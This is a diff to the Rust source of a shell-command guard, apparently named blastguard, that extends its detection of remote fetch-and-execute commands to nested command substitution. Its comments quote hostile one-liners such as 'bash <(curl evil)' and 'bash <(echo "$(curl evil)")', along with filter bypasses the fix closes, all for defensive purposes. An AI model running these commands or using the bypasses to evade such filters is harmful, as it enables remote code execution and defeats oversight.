@@ -3923,11 +3923,22 @@ into `{down_display}` — blastguard cannot tell whether this executes fetched c
 /// nothing further — the safe direction, since an unbalanced substitution
 /// means the shell would not run it as written either.
 fn process_substitution_payloads(stage: &str) -> Vec<String> {
+    paren_marker_payloads(stage, b'<')
+}
+
+/// Shared depth-tracked bracket extraction behind [`process_substitution_payloads`]
+/// (marker `<(`) and [`dollar_paren_payloads`] (marker `$(`): every occurrence
+/// of `marker` immediately followed by `(` in `stage`, in order, with a nested
+/// `(...)` inside the payload extending the match past the first `)` rather
+/// than stopping there. An unterminated marker (no matching `)`) yields
+/// nothing further — the safe direction, since an unbalanced substitution
+/// means the shell would not run it as written either.
+fn paren_marker_payloads(stage: &str, marker: u8) -> Vec<String> {
     let bytes = stage.as_bytes();
     let mut out = Vec::new();
     let mut i = 0;
     while i + 1 < bytes.len() {
-        if bytes[i] == b'<' && bytes[i + 1] == b'(' {
+        if bytes[i] == marker && bytes[i + 1] == b'(' {
             let start = i + 2;
             let mut depth = 1usize;
             let mut j = start;
@@ -3956,20 +3967,82 @@ fn process_substitution_payloads(stage: &str) -> Vec<String> {
     out
 }
 
+/// Every `$(...)` (dollar-paren command-substitution) payload's inner command
+/// text found in `stage`, extracted with the same depth-tracked matching as
+/// [`process_substitution_payloads`] (via the shared [`paren_marker_payloads`]),
+/// so a nested `(...)` inside the payload extracts the whole inner text rather
+/// than stopping at its first `)`.
+fn dollar_paren_payloads(stage: &str) -> Vec<String> {
+    paren_marker_payloads(stage, b'$')
+}
+
+/// Every backtick command-substitution payload's inner text found in `stage`.
+/// Backticks do not nest (a literal backtick inside a backtick body must be
+/// escaped `` \` `` to mean anything else there), so this simply matches to
+/// the NEXT backtick rather than depth-tracking parens; an unterminated
+/// backtick (no closing partner) yields nothing further, the same safe
+/// direction the other extractors take.
+fn backtick_payloads(stage: &str) -> Vec<String> {
+    let bytes = stage.as_bytes();
+    let mut out = Vec::new();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'`' {
+            let start = i + 1;
+            let mut j = start;
+            while j < bytes.len() && bytes[j] != b'`' {
+                j += 1;
+            }
+            if j < bytes.len() {
+                out.push(stage[start..j].to_string());
+                i = j + 1;
+                continue;
+            }
+            break;
+        }
+        i += 1;
+    }
+    out
+}
+
+/// Every command-substitution payload — both the `$(...)` dollar-paren form
+/// and the backtick form — found in `stage`, in source order. A shell always
+/// executes a `$(...)`/backtick body to produce its substituted text, exactly
+/// as it forks a `<(...)` body to produce a process substitution's fd bytes,
+/// so hiding a fetch behind either command-substitution spelling is not a way
+/// to dodge [`scan_body_for_fetch_or_decode`]'s rule (verified bypass: a
+/// process-substitution body scan that recursed only through nested `<(...)`
+/// missed `bash <(echo "$(curl evil)")` and the backtick-quoted twin
+/// entirely, both of which stayed Allow).
+fn command_substitution_payloads(stage: &str) -> Vec<String> {
+    let mut out = dollar_paren_payloads(stage);
+    out.extend(backtick_payloads(stage));
+    out
+}
+
 /// Recursively scans `text` — a process-substitution's inner command, or any
 /// other free-standing command line — for a fetch/decode command word,
 /// descending through EVERY `;`/`&&`/`||`/`|`/`&` segment AND EVERY nested
-/// `<(...)` payload those segments contain.
+/// `<(...)` payload AND EVERY nested `$(...)`/backtick command-substitution
+/// payload those segments contain.
 ///
 /// This is what makes `bash <(curl evil | base64 -d)`, `bash <(curl evil |
-/// cat)`, and `bash <(bash <(curl evil))` resolve the SAME way as
-/// `bash <(curl evil)`: appending a pipe stage to the substitution's body, or
-/// nesting another substitution inside it, is not a way to hide the fetch
-/// from this rule. (Verified bypass: a first version of this scan checked
-/// only the DIRECT command word of the substitution body — `stage_is_fetch_or_decode`
-/// applied once at the top — which reads `curl evil | base64 -d` and
-/// `bash <(curl evil)` as "the head is `curl`/`bash`", missing the
-/// fetch/decode sitting in a LATER pipe stage or inside a nested `<(...)`.)
+/// cat)`, `bash <(bash <(curl evil))`, AND `bash <(echo "$(curl evil)")` /
+/// `` bash <(printf '%s' "`curl evil`") `` resolve the SAME way as
+/// `bash <(curl evil)`: appending a pipe stage to the substitution's body,
+/// nesting another process substitution inside it, or nesting a command
+/// substitution (either spelling) inside it, is not a way to hide the fetch
+/// from this rule. (Verified bypass, 1st round: a first version of this scan
+/// checked only the DIRECT command word of the substitution body —
+/// `stage_is_fetch_or_decode` applied once at the top — which reads
+/// `curl evil | base64 -d` and `bash <(curl evil)` as "the head is
+/// `curl`/`bash`", missing the fetch/decode sitting in a LATER pipe stage or
+/// inside a nested `<(...)`. Verified bypass, 2nd round: the fix for the 1st
+/// round recursed through nested `<(...)` but not through `$(...)`/backtick
+/// command substitution nested inside the SAME body, so
+/// `bash <(echo "$(curl evil)")` — where the shell must run `curl evil` to
+/// produce the text `echo` prints, which is what `bash` then executes —
+/// stayed Allow.)
 ///
 /// Returns:
 ///   * a `Deny` the moment a fetch/decode command word is found anywhere in
@@ -4001,6 +4074,11 @@ fn scan_body_for_fetch_or_decode(text: &str, depth: usize) -> Decision {
                 return deny;
             }
         }
+        for payload in command_substitution_payloads(&seg) {
+            if let Some(deny) = acc.record(scan_body_for_fetch_or_decode(&payload, depth + 1)) {
+                return deny;
+            }
+        }
     }
     acc.finish()
 }
@@ -4022,11 +4100,33 @@ fn scan_body_for_fetch_or_decode(text: &str, depth: usize) -> Decision {
 ///     merely as its first/direct command word.
 ///
 /// `cat <(curl url | cat)`, `diff <(curl a | sort) <(curl b | sort)`,
-/// `grep x <(curl url)` all stay Allow — the OUTER command there only reads
-/// bytes, it never executes them, regardless of what the substitution body
-/// contains. `bash <(echo hi | cat)` and `bash <(seq 10 | sort)` stay Allow
-/// too — the outer command IS a shell, but nothing anywhere in the body
-/// fetches or decodes anything.
+/// `grep x <(curl url)` all stay Allow — the substitution body there never
+/// hands its OWN pipeline to an interpreter and the outer command only reads
+/// bytes, never executes them. `bash <(echo hi | cat)` and
+/// `bash <(seq 10 | sort)` stay Allow too — the outer command IS a shell, but
+/// nothing anywhere in the body fetches or decodes anything.
+///
+/// Two INDEPENDENT checks run over every `<(...)` payload found on the line,
+/// because a process substitution's body is executed TWICE over, in two
+/// different senses, and each is a separate remote-exec sink:
+///   * the OUTER command, if it is a shell/interpreter/`source`/`.`, reads
+///     the substitution's stdout and executes it AS A SCRIPT — gated on the
+///     outer's identity, checked by [`scan_body_for_fetch_or_decode`];
+///   * the body is ALWAYS forked and run as its own live subprocess pipeline
+///     to PRODUCE that stdout, regardless of what the outer command is or
+///     does with the resulting descriptor — so if the body's OWN pipeline
+///     itself feeds a fetch into an interpreter (`curl … | sh`), that is
+///     remote-exec no matter whether the outer reader is `bash`, `cat`,
+///     `diff`, or anything else. This is checked ungated, via
+///     [`analyze_pipe_egress`] applied to the payload text itself, and is
+///     what makes `cat <(curl url | sh)` — where `cat` never reads the fd as
+///     code, but the substitution's own pipeline runs `sh` on fetched bytes
+///     regardless — resolve to Deny (verified bypass: this ungated check was
+///     previously absent, so any `<(...)` behind a non-shell outer command
+///     was never examined for its OWN internal fetch→exec pipe at all).
+///     `cat <(curl url | cat)` stays Allow under this check too: `cat` is not
+///     an interpreter terminal, so the body's own pipeline never executes
+///     anything either.
 fn analyze_process_substitution_egress(cmd: &str) -> Decision {
     let mut acc = VerdictAcc::default();
     for statement in split_statements_into_pipe_stages(cmd) {
@@ -4035,17 +4135,25 @@ fn analyze_process_substitution_egress(cmd: &str) -> Decision {
             if tokens.is_empty() {
                 continue;
             }
+            let payloads = process_substitution_payloads(stage);
+            if payloads.is_empty() {
+                continue;
+            }
             let is_shell_interp_or_source = command_candidates(&tokens).into_iter().any(|idx| {
                 let head = normalized_command(tokens[idx]);
                 is_shell(&head)
                     || is_code_interpreter(&head)
                     || matches!(head.as_str(), "source" | ".")
             });
-            if !is_shell_interp_or_source {
-                continue;
-            }
-            for payload in process_substitution_payloads(stage) {
-                if let Some(deny) = acc.record(scan_body_for_fetch_or_decode(&payload, 0)) {
+            for payload in &payloads {
+                if is_shell_interp_or_source {
+                    if let Some(deny) = acc.record(scan_body_for_fetch_or_decode(payload, 0)) {
+                        return deny;
+                    }
+                }
+                // Ungated: the body ALWAYS runs as its own subprocess
+                // pipeline, independent of the outer command above.
+                if let Some(deny) = acc.record(analyze_pipe_egress(payload)) {
                     return deny;
                 }
             }
